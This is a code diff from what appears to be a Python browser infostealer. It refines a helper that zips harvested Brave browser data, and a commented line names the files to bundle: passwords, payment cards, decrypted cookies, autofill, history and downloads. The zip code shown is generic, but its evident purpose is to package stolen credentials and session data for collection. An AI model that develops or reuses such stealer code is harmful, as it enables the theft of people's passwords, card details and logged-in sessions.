@@ -370,17 +370,30 @@ def fetch_autofill(dir):
 ##Zip files
 ##
 
+#def zip(name, files):
+#    try:
+#        with zipfile.ZipFile(name, "w") as zip:
+#            for file in files:
+#                try:
+#                    zip.write(file)
+#                except:
+#                    pass
+#    except:
+#        pass
+
 def zip(name, files):
     try:
         with zipfile.ZipFile(name, "w") as zip:
             for file in files:
                 try:
-                    zip.write(file)
+                    if os.path.exists(file):
+                        zip.write(file)
+                    else: continue
                 except:
                     pass
     except:
         pass
-    
+
 #zip("Brave.zip", ["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
 
 
